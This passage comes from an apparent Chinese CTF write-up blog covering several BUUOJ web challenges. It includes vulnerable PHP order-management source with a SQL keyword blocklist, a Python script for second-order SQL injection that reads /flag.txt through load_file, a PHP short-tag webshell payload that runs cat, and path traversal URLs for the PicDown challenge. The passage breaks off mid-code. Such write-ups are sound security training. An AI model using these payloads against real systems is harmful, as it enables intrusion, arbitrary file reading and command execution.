class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;修改收货地址&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span>&gt;修改收货地址&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;姓名:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;电话:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;地址:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">address</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;修改订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;订单管理&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;返回&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要查订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我不想要了&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="delete-php-1"><a href="#delete-php-1" class="headerlink" title="delete.php"></a>delete.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单删除成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;删除订单&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span>&gt;删除订单&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;姓名:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;电话:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;删除订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot; <span class="title">style</span>=&quot;<span class="title">color</span>:#<span class="title">ffffff</span>;&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;订单管理&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;返回&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要查订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要修改收货地址&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>change.php</code>中的<code>address</code>没被过滤，考虑二次注入（注意<code>flag</code>在文件里），简单写了个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c252b030-01a3-4a8f-9b73-8f6a8a71bc2f.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">confirm</span>(<span class="params">username</span>):</span><br><span class="line">url_confirm = url + <span class="string">&quot;confirm.php&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;address&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;phone&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;user_name&#x27;</span>:username</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url_confirm,data=data)</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>+username+<span class="string">&quot;已提交订单&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]订单提交成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">username, address</span>):</span><br><span class="line">url_change = url + <span class="string">&quot;change.php&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;address&#x27;</span>:address,</span><br><span class="line"><span class="string">&#x27;phone&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;user_name&#x27;</span>:username</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url=url_change,data=data)</span><br><span class="line">r = requests.post(url=url_change,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;订单修改成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]订单修改成功!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[-]Error!\n&quot;</span>+r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">username</span>):</span><br><span class="line">url_search = url + <span class="string">&quot;search.php&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;phone&quot;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line"><span class="string">&quot;user_name&quot;</span>:username</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url_search,data=data)</span><br><span class="line"><span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">username = <span class="string">&quot;flag&quot;</span> </span><br><span class="line">address = <span class="string">&quot;&#x27;,`address`=(select load_file(&#x27;/flag.txt&#x27;))#&quot;</span></span><br><span class="line">confirm(username)</span><br><span class="line">change(username,address)</span><br><span class="line">res = search(username)</span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line">flag = re.findall(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>,res)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>采用<code>php短标签</code>形式即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://86b8a10c-6541-4fda-a7d4-89a2f8815a45.node4.buuoj.cn:81/?action=upload&amp;data=&lt;?=`cat%09/flllllll1112222222lag`?&gt;</span><br></pre></td></tr></table></figure><p>然后<code>pwd</code>看下路径访问即可</p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>修改<code>Cookie</code>即可</p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/page?url=../../../../flag</span><br></pre></td></tr></table></figure><h3 id="正常解"><a href="#正常解" class="headerlink" title="正常解"></a>正常解</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/page?url=../../../../app/app.py</span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span 